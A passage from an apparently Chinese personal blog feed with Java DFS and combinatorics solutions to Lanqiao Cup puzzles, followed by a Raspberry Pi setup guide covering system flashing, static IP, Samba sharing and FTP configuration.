class="number">9</span>) &#123;</div><div class="line">                <span class="keyword">int</span> a = stack.get(<span class="number">0</span>);</div><div class="line">                <span class="keyword">int</span> b = stack.get(<span class="number">1</span>);</div><div class="line">                <span class="keyword">int</span> c = stack.get(<span class="number">2</span>);</div><div class="line">                <span class="keyword">int</span> d = stack.get(<span class="number">3</span>);</div><div class="line">                <span class="keyword">int</span> e = stack.get(<span class="number">4</span>);</div><div class="line">                <span class="keyword">int</span> f = stack.get(<span class="number">5</span>);</div><div class="line">                <span class="keyword">int</span> g = stack.get(<span class="number">6</span>);</div><div class="line">                <span class="keyword">int</span> h = stack.get(<span class="number">7</span>);</div><div class="line">                <span class="keyword">int</span> i = stack.get(<span class="number">8</span>);</div><div class="line">                <span class="keyword">int</span> DEF = d * <span class="number">100</span> + e * <span class="number">10</span> + f;</div><div class="line">                <span class="keyword">int</span> GHI = g * <span class="number">100</span> + h * <span class="number">10</span> + i;</div><div class="line">                <span class="keyword">int</span> left = a * c * GHI + b * GHI + DEF * c;</div><div class="line">                <span class="keyword">int</span> right = <span class="number">10</span> * c * GHI;</div><div class="line">                <span class="keyword">if</span> (left == right ) &#123;</div><div class="line">                    count++;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">return</span>;</div><div class="line">            &#125;<span class="number">0</span></div><div class="line">            <span class="keyword">if</span> (!stack.contains(j)) &#123;</div><div class="line">                stack.push(j);</div><div class="line">                fun(stack);</div><div class="line">                stack.pop();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面其实是把那个等式做了一次等价变换，这样的话就不需要计算小数，也不需要考虑精度的问题了。同样的，不利用stack我们也可以根据数据完成相同的效果：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.*;</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cal</span></span></div><div class="line">&#123;</div><div class="line"> <span class="keyword">static</span> <span class="keyword">boolean</span> k[]=<span class="keyword">new</span> <span class="keyword">boolean</span>[<span class="number">10</span>];  <span class="comment">//判断这个数有没有被取过</span></div><div class="line"> <span class="keyword">static</span> <span class="keyword">int</span> g[]=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];<span class="comment">//存放9个数</span></div><div class="line"> <span class="keyword">static</span> <span class="keyword">int</span> count=<span class="number">0</span>;</div><div class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></div><div class="line"> &#123;</div><div class="line">      ff(<span class="number">1</span>);</div><div class="line">      System.out.println(count);</div><div class="line"> &#125;</div><div class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ff</span><span class="params">(<span class="keyword">int</span> m)</span></span></div><div class="line"> &#123;</div><div class="line">     <span class="keyword">if</span>(m==<span class="number">10</span>)&#123;</div><div class="line">        <span class="keyword">if</span>(check())count++;</div><div class="line">     &#125;</div><div class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++)</div><div class="line">     &#123;</div><div class="line">         <span class="keyword">if</span>(k[i]==<span class="keyword">false</span>)</div><div class="line">         &#123;</div><div class="line">             k[i]=<span class="keyword">true</span>;    <span class="comment">//回溯法</span></div><div class="line">             g[m]=i;</div><div class="line">             System.out.printf(<span class="string">"g[m]=%d  m=%d\n"</span>, g[m], m);</div><div class="line">             ff(m+<span class="number">1</span>);</div><div class="line">             k[i]=<span class="keyword">false</span>;</div><div class="line">         &#125;</div><div class="line">     &#125;</div><div class="line"> &#125;</div><div class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">()</span>  <span class="comment">//检验是不是为10</span></span></div><div class="line"> &#123;</div><div class="line">     <span class="keyword">double</span> q=g[<span class="number">1</span>];</div><div class="line">     <span class="keyword">double</span> w=g[<span class="number">2</span>]*<span class="number">1.00</span>/g[<span class="number">3</span>];</div><div class="line">     <span class="keyword">double</span> e=(g[<span class="number">4</span>]*<span class="number">100</span>+g[<span class="number">5</span>]*<span class="number">10</span>+g[<span class="number">6</span>])*<span class="number">1.00</span>/(g[<span class="number">7</span>]*<span class="number">100</span>+g[<span class="number">8</span>]*<span class="number">10</span>+g[<span class="number">9</span>]);</div><div class="line">     <span class="keyword">if</span>(q+w+e==<span class="number">10.00</span>)<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">     <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们使用的就是DFS，首先直接从1开始遍历到底，然后向上层节点回溯，为了解释清楚这个玩意，我还画了一张图：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-25%20%E4%B8%8B%E5%8D%886.14.15.png" alt="屏幕快照 2018-01-25 下午6.14.15.png" title="" class="">
                <p>屏幕快照 2018-01-25 下午6.14.15.png</p>
            </figure>
<p>这两种方法都是实现的同一种思想，只不过实现的方式不同罢了。</p>
<h1 id="分小组"><a href="#分小组" class="headerlink" title="分小组"></a>分小组</h1><p>这一道题其实可以使用数学的方法来解决，我还专门花了一天的时间去学习组合数学相关的知识，这才把高中的排列组合知识捡回来，这里推荐一下学堂在线上的组合数学公开课，讲的还是挺形象的:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-26%20%E4%B8%8A%E5%8D%8811.53.00.png" alt="屏幕快照 2018-01-26 上午11.53.00.png" title="" class="">
                <p>屏幕快照 2018-01-26 上午11.53.00.png</p>
            </figure>
<p>下面看题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">9名运动员参加比赛，需要分3组进行预赛。</div><div class="line"></div><div class="line">有哪些分组的方案呢？</div><div class="line"></div><div class="line">我们标记运动员为 A,B,C,... I</div><div class="line"></div><div class="line">下面的程序列出了所有的分组方法。</div><div class="line"></div><div class="line">该程序的正常输出为：</div><div class="line"></div><div class="line">ABC DEF GHI</div><div class="line">ABC DEG FHI</div><div class="line">ABC DEH FGI</div><div class="line">…</div></pre></td></tr></table></figure>
<p>用代码来解决的思路还是比较好想的，直接阅读代码即可：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></div><div class="line">&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">remain</span><span class="params">(<span class="keyword">int</span>[] a)</span></span></div><div class="line">    &#123;</div><div class="line">        String s = <span class="string">""</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;a.length; i++)&#123;</div><div class="line">            <span class="keyword">if</span>(a[i] == <span class="number">0</span>) s += (<span class="keyword">char</span>)(i+<span class="string">'A'</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> s;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">(String s, <span class="keyword">int</span>[] a)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;a.length; i++)&#123;</div><div class="line">            <span class="keyword">if</span>(a[i]==<span class="number">1</span>) <span class="keyword">continue</span>;</div><div class="line">            a[i] = <span class="number">1</span>;</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>; j&lt;a.length; j++)&#123;</div><div class="line">                <span class="keyword">if</span>(a[j]==<span class="number">1</span>) <span class="keyword">continue</span>;</div><div class="line">                a[j]=<span class="number">1</span>;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=j+<span class="number">1</span>; k&lt;a.length; k++)&#123;</div><div class="line">                    <span class="keyword">if</span>(a[k]==<span class="number">1</span>) <span class="keyword">continue</span>;</div><div class="line">                    a[k]=<span class="number">1</span>;  </div><div class="line">                    System.out.println(s+<span class="string">" "</span>+(<span class="keyword">char</span>)(i+<span class="string">'A'</span>)+(<span class="keyword">char</span>)(j+<span class="string">'A'</span>)+(<span class="keyword">char</span>)(k+<span class="string">'A'</span>)+<span class="string">" "</span>+remain(a));</div><div class="line">                    a[k]=<span class="number">0</span>;</div><div class="line">                &#125;</div><div class="line">                a[j]=<span class="number">0</span>;</div><div class="line">            &#125;</div><div class="line">            a[i] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">int</span>[] a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">9</span>];</div><div class="line">        a[<span class="number">0</span>] = <span class="number">1</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> b=<span class="number">1</span>; b&lt;a.length; b++)&#123;</div><div class="line">            a[b] = <span class="number">1</span>;</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> c=b+<span class="number">1</span>; c&lt;a.length; c++)&#123;</div><div class="line">                a[c] = <span class="number">1</span>;</div><div class="line">                String s = <span class="string">"A"</span> + (<span class="keyword">char</span>)(b+<span class="string">'A'</span>) + (<span class="keyword">char</span>)(c+<span class="string">'A'</span>);</div><div class="line">                f(s,a);</div><div class="line">                a[c] = <span class="number">0</span>;</div><div class="line">            &#125;</div><div class="line">            a[b] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果是从数学的角度来考虑我们就不能遗漏掉任何一种情况，不然都解决不了，首先抽象一下题干中的信息，九个不同的队，分到三组，每一组都要分到三个队所以这个应该只有排列没有组合，我们通过下面几步来解决：</p>
<ol>
<li>首先确立一个x队放在一组中，这个x是任意的，所以我们不需要C(9,1)，这一点很重要</li>
<li>然后我们将这一组填充完毕，因为不需要考虑顺序，所以是C(8,2)</li>
<li>然后我们继续填充第二个组，也就是挑出三个队，为C(6,3)，最后一组的答案也就确定了</li>
</ol>
<p>通过上面的三个分步推导得到结果C(8,2)xC(6,3)=560，最常见的错误解法就是直接通过C(9,3)xC(6,3)，至于为什么不能这样，我们直接看，当只有四支球队分两组的情况，这个时候有几种呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 3		2 4</div><div class="line">1 2		3 4</div><div class="line">1 4		2 3</div></pre></td></tr></table></figure>
<p>只有这三种情况，也就是C(3,1)而不是C(4,2)，因为前后两步之间并不是独立的，所以不能使用乘法，组内是无序的，组之间也是无序的，只有考虑的周全，才可以直接通过简单的方式去解决问题，不然还是暴力枚举吧嘻嘻</p>
<h1 id="方格填数"><a href="#方格填数" class="headerlink" title="方格填数"></a>方格填数</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">如下的10个格子</div><div class="line"></div><div class="line">+--+--+--+</div><div class="line">| | | |</div><div class="line">+--+--+--+--+</div><div class="line">| | | | |</div><div class="line">+--+--+--+--+</div><div class="line">| | | |</div><div class="line">+--+--+--+</div><div class="line"></div><div class="line">（如果显示有问题，也可以参看【图1.jpg】）</div><div class="line"></div><div class="line">填入0~9的数字。要求：连续的两个数字不能相邻。</div><div class="line">（左右、上下、对角都算相邻）</div><div class="line"></div><div class="line">一共有多少种可能的填数方案？</div><div class="line"></div><div class="line">请填写表示方案数目的整数。</div><div class="line">注意：你提交的应该是一个整数，不要填写任何多余的内容或说明性文字。</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-26%20%E4%B8%8A%E5%8D%8810.33.57.png" alt="屏幕快照 2018-01-26 上午10.33.57.png" title="" class="">
                <p>屏幕快照 2018-01-26 上午10.33.57.png</p>
            </figure>
<p>这一题同样可以使用DFS去解决，思路其实和前面的凑算式差不多，只不过需要修改判断的条件罢了，只要掌握了前面一种，这一题也就没什么难度了，下面看看用栈来解决的代码思路；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.Stack;</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FillNumber</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> count = <span class="number">0</span>;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">        <span class="keyword">long</span> startTime = System.currentTimeMillis();</div><div class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</div><div class="line">        fun(stack);</div><div class="line">        <span class="keyword">long</span> endTime = System.currentTimeMillis();</div><div class="line">        System.out.println(<span class="string">"时间: "</span> + (endTime - startTime));</div><div class="line">        System.out.println(<span class="string">"count="</span> + count);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">(Stack&lt;Integer&gt; stack)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (stack.size() == <span class="number">10</span>) &#123;</div><div class="line">            <span class="keyword">int</span> A[] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</div><div class="line">            A[<span class="number">0</span>] = stack.get(<span class="number">0</span>);</div><div class="line">            A[<span class="number">1</span>] = stack.get(<span class="number">1</span>);</div><div class="line">            A[<span class="number">2</span>] = stack.get(<span class="number">2</span>);</div><div class="line">            A[<span class="number">3</span>] = stack.get(<span class="number">3</span>);</div><div class="line">            A[<span class="number">4</span>] = stack.get(<span class="number">4</span>);</div><div class="line">            A[<span class="number">5</span>] = stack.get(<span class="number">5</span>);</div><div class="line">            A[<span class="number">6</span>] = stack.get(<span class="number">6</span>);</div><div class="line">            A[<span class="number">7</span>] = stack.get(<span class="number">7</span>);</div><div class="line">            A[<span class="number">8</span>] = stack.get(<span class="number">8</span>);</div><div class="line">            A[<span class="number">9</span>] = stack.get(<span class="number">9</span>);</div><div class="line">            <span class="keyword">boolean</span> one = isNeibor(A[<span class="number">0</span>], A[<span class="number">1</span>], A[<span class="number">5</span>], A[<span class="number">4</span>], A[<span class="number">3</span>]) &amp;&amp; isNeibor(A[<span class="number">1</span>], A[<span class="number">0</span>], A[<span class="number">2</span>], A[<span class="number">6</span>], A[<span class="number">5</span>], A[<span class="number">4</span>]) &amp;&amp; isNeibor(A[<span class="number">2</span>], A[<span class="number">1</span>], A[<span class="number">5</span>], A[<span class="number">6</span>]);</div><div class="line">            <span class="keyword">boolean</span> two = isNeibor(A[<span class="number">3</span>], A[<span class="number">0</span>], A[<span class="number">4</span>], A[<span class="number">8</span>], A[<span class="number">7</span>]) &amp;&amp; isNeibor(A[<span class="number">4</span>], A[<span class="number">0</span>], A[<span class="number">8</span>], A[<span class="number">5</span>], A[<span class="number">9</span>], A[<span class="number">8</span>], A[<span class="number">7</span>], A[<span class="number">3</span>])</div><div class="line">                    &amp;&amp; isNeibor(A[<span class="number">5</span>], A[<span class="number">0</span>], A[<span class="number">1</span>], A[<span class="number">2</span>], A[<span class="number">6</span>], A[<span class="number">9</span>], A[<span class="number">8</span>], A[<span class="number">4</span>]) &amp;&amp; isNeibor(A[<span class="number">6</span>], A[<span class="number">2</span>], A[<span class="number">1</span>], A[<span class="number">5</span>], A[<span class="number">9</span>]);</div><div class="line">            <span class="keyword">boolean</span> three = isNeibor(A[<span class="number">7</span>],  A[<span class="number">8</span>]) &amp;&amp; isNeibor(A[<span class="number">8</span>], A[<span class="number">9</span>]);</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (one &amp;&amp; two &amp;&amp; three) &#123;</div><div class="line">                System.out.printf(<span class="string">"%d,%d,%d, %d,%d,%d,%d, %d,%d,%d\n"</span>, A[<span class="number">0</span>], A[<span class="number">1</span>], A[<span class="number">2</span>], A[<span class="number">3</span>], A[<span class="number">4</span>], A[<span class="number">5</span>], A[<span class="number">6</span>], A[<span class="number">7</span>], A[<span class="number">8</span>], A[<span class="number">9</span>]);</div><div class="line">                count++;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</div><div class="line">            <span class="keyword">if</span> (!stack.contains(j)) &#123;</div><div class="line">                stack.push(j);</div><div class="line">                fun(stack);</div><div class="line">                stack.pop();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">boolean</span> <span class="title">isNeibor</span><span class="params">(<span class="keyword">int</span> ...args)</span></span>&#123;</div><div class="line">        <span class="keyword">int</span> first = args[<span class="number">0</span>];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; args.length; i++) &#123;</div><div class="line">            <span class="keyword">if</span> (Math.abs(first - args[i]) == <span class="number">1</span>) &#123;</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 蓝桥杯 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[玩转树莓派(一)]]></title>
      <url>/2018/01/24/%E7%8E%A9%E8%BD%AC%E6%A0%91%E8%8E%93%E6%B4%BE-%E4%B8%80/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-24%20%E4%B8%8B%E5%8D%889.04.31.png" height="350" width="600" alt=""></p>
<p>在树莓派上折腾ARM的汇编，玩点小游戏，轻松上网岂不美哉，顺便恶补一下硬件知识</p>
<a id="more"></a>
<h1 id="什么是树莓派"><a href="#什么是树莓派" class="headerlink" title="什么是树莓派"></a>什么是树莓派</h1><p>这个玩意其实说白了就是一个便宜的教育用微机，非专业的其实玩他的意义不大，正常人想玩回家拿个iPad躺在床上看电视剧，就算想省钱买个国产的也是可以的，拿着树莓派除了玩一些弱智游戏别无他用，它甚至还没有你的手机性能好呢，而且电脑上都不会装linux的好么。</p>
<p>话又说回来，其实在专业人士手里他其实也是一个玩具，说拿它跑个人网站，我好几台云服务器，拿他做NAS或者私有的git服务器，等板子少了数据丢失如果没有做备份哭都没有地方哭。所以如果有需要一个持续开机的电脑，一个用来学习Linux，学习简单编程的电脑，或者用它来打造某些好玩的设备，那它就比较合适。</p>
<p>总的来说，树莓派就是一个玩具，今天我们就一起来玩转树莓派吧</p>
<h1 id="装系统"><a href="#装系统" class="headerlink" title="装系统"></a>装系统</h1><p>给树莓派装系统，实质上也就是把系统烧录到SD卡中，一开始我不知道，在官网上下了一个Lite版的，只有一个恢复模式，类似于一个Mac上的Recovery mode，上面联网装操作系统，但是由于这个网络状况，一直都下载不成功，于是我重新看了一遍教程，将镜像下载下来，然后将镜像烧录卡中。</p>
<p>这其中需要注意有两点，一个是这个SD卡最好是8G以上，而且装镜像之前要格式化（推荐使用SD Formatter），格式化成FAT32文件系统，另外一点就是烧录的工具推荐使用Win32DiskManaer，总的教程我丢了一份在我的云服务器上，直接ftp访问下载即可。<a href="ftp://118.89.38.168/data/" target="_blank" rel="external">下载地址</a></p>
<p>安装了之后如果我们是直接在树莓派上操作会发现键盘用起来有些奇怪，这是因为默认是英式键盘的关系，我们使用命令去修改默认的配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo raspi-config</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-24%20%E4%B8%8B%E5%8D%8810.34.27.png" alt="屏幕快照 2018-01-24 下午10.34.27.png" title="" class="">
                <p>屏幕快照 2018-01-24 下午10.34.27.png</p>
            </figure>
<p>剩下的可以参考网上的教程了，在我修改了之后还是发现打不出英文的双引号，然后我就放弃了，之后都是用ssh直接连过去，当个稳定的服务器还是不错的，目前只是在上面跑一个ftp服务，毕竟四处皆网盘嘛，多做几次备份总是没坏处的，就是这么的小心谨慎。</p>
<h1 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h1><p>对技术人员来说，可以做的事情就很多了，可以将它做为一台个人服务器，在上面放网站或者博客之类的，也可以做硬件改造，做成一个阅读器，当蓝牙音箱，或者作为一个路由器/跳板，在上面跑加速，如果可以跑一个集群起来还可以做一套智能家居了。总的来说，基本就是一个可塑性极强的玩具(只对技术人员来说)。</p>
<p>下面我们来看看怎么给树莓派装上一个风扇，当然现在有可能买的时候就已经装好了：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-25%20%E4%B8%8A%E5%8D%8812.06.08.png" alt="屏幕快照 2018-01-25 上午12.06.08.png" title="" class="">
                <p>屏幕快照 2018-01-25 上午12.06.08.png</p>
            </figure>
<p>然后我们需要支持中文，在本机上折腾的话还是会有点麻烦，就像我当时在Kali上安装输入法的时候也下了很大的功夫，建议还是通过ssh来连接，如果你不是把它当作一个微主机来用的话。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get instal ttf-wqy-microhei</div><div class="line">sudo apt-get install scim-pinyin</div><div class="line">sudo dpkg-reconfigure locales</div></pre></td></tr></table></figure>
<p>这里要注意的一点就是Raspbian在现在的版本是默认禁用ssh的，所以我们通过修改config来开启，网络的配置上我们为了求稳选择和路由器无线连接，并且为它配置一个静态IP。</p>
<p>Raspbian是基于Debian的一个优化版本，所以在配置上也基本是兼容的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">auto lo</div><div class="line">iface lo inet loopback</div><div class="line">iface eth0 inet dhcp</div><div class="line">auto wlan0</div><div class="line">allow-hotplug wlan0</div><div class="line">iface wlan0 inet manual</div><div class="line">    wpa-roam /home/pi/wlan0.conf</div><div class="line">iface default inet static</div><div class="line">    address 192.168.1.7</div><div class="line">    gateway 192.168.1.1</div><div class="line">    netmask 255.255.255.0</div><div class="line">    network 192.168.1.0</div><div class="line">    broadcast 192.168.1.255</div></pre></td></tr></table></figure>
<p>配置写在<code>/etc/network/interfaces</code>中。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-25%20%E4%B8%8A%E5%8D%8812.11.17.png" alt="屏幕快照 2018-01-25 上午12.11.17.png" title="" class="">
                <p>屏幕快照 2018-01-25 上午12.11.17.png</p>
            </figure>
<p>目前已经正常运行了一天了，但是很坑的一点就是如果这个玩具坏掉，也许会把你的卡槽都烧掉，到时候可能你就不会再想玩这种玩具了。</p>
<h1 id="开启SMB实现文件共享"><a href="#开启SMB实现文件共享" class="headerlink" title="开启SMB实现文件共享"></a>开启SMB实现文件共享</h1><p>首先要更新一下软件源：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div></pre></td></tr></table></figure>
<p>安装samba</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install samba samba-common-bin</div></pre></td></tr></table></figure>
<p>安装完成后，配置/etc/samba/smb.conf文件.</p>
<p>在其最后添加以下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#================================================</div><div class="line"> </div><div class="line">[share]                                   #共享文件的名称，将在网络上以此名称显示</div><div class="line">        path = /samba                     #共享文件的路径</div><div class="line">        valid users = root pi             #允许访问的用户，这里我用的是root 和 pi 两个用户</div><div class="line">        browseable = yes                  #允许浏览                                 </div><div class="line">        public = yes                      #共享开放                                      </div><div class="line">        writable = yes                    #可写</div><div class="line"> </div><div class="line">#================================================</div></pre></td></tr></table></figure>
<p>其他的权限修改可以自行查阅资料，保存后，重启samba服务，输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/samba restart</div></pre></td></tr></table></figure>
<p> 最后添加共享用户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">smbpasswd –a pi  #直接使用了默认用户pi</div></pre></td></tr></table></figure>
<p>之后的各种权限配置就可以参考ftp了，正好今天也刚在腾讯云上搭了一个ftp，就说一个比较常见的问题。关于匿名用户的权限，我们通过账号密码登陆的一般显示的都是<code>/home/ftp</code>下的文件路径，但是匿名用户显示的则是<code>/srv/ftp</code>下的，所以匿名用户的权限体现只能在这个目录下去体现。</p>
<p>之前还在配置文件中改了半天，都不能匿名用户显示读取文件，原来是文件放错了位置。</p>
